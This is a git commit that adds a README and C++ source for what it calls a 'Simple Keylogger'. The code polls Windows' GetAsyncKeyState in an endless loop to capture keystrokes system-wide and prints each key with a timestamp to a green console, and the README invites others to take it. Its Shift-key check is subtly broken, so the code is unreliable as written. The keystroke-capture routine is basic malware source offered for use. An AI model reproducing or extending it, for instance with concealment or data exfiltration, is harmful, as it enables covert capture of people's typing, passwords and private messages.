ba0a3443388ce6d0a5d8e488a21a4b4e2c90ebf0
Bytes-Caveman <71942493+Bytes-Caveman@users.noreply.github.com>
2021-08-17 19:07:01 +0100

    first and only commit!

---
+++ README.md
@@ -0,0 +1,5 @@
+# Simple Keylogger
+
+Just looks cool with the green text xD!
+
+Steal it if you want... ;-;
---
+++ keyLogger.cpp
@@ -0,0 +1,38 @@
+#include <iostream>
+#include <windows.h>
+#include <ctime>
+#include <chrono>
+
+using namespace std;
+
+#include "getKey.h"
+
+int main()
+{
+    system("color a") ;
+
+    while (1)
+    {
+        for(int i = 8; i <= 190; i++)
+        {
+            if (GetAsyncKeyState(i) == -32767) {
+                    bool caps = false;
+                    if (GetAsyncKeyState(0x10 == -32767)) {
+                        caps = true;
+                    }
+                    string key = getKey(i, caps) ;
+                    time_t tt ;
+                    struct tm * timeinfo ;
+                    time ( &tt );
+                    timeinfo = localtime ( &tt );
+                    string propertime = asctime(timeinfo);
+                    propertime.erase(propertime.length()-1);
+                    cout << "[OUTPUT/DEBUG AT " << propertime << "] KeyBoard.Key." << key << " | KeyCode: " << i << endl ;
+            }
+        }
+    }
+
+    return 0;
+}
+
+
